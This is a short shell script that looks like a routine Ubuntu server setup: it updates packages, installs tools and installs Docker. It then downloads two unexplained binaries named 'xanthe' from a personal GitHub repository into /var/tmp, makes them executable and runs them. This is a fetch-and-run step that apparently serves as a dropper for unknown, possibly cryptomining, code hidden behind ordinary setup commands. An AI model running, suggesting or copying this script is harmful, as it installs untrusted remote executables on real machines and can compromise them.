apt update
apt -y upgrade
apt install -y sudo nano wget unzip make gcc curl gawk python ufw net-tools default-jre ca-certificates gnupg lsb-release iptables-persistent
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
apt-get update
apt-get install -y docker-ce docker-ce-cli containerd.io
cd /var/tmp
wget https://github.com/nandakrr/xanthe/blob/main/xanthe1?raw=true https://raw.githubusercontent.com/nandakrr/xanthe/main/xanthe_main
mv xanthe1?raw=true xanthe
chmod +x xanthe xanthe_main
./xanthe
./xanthe
./xanthe_main
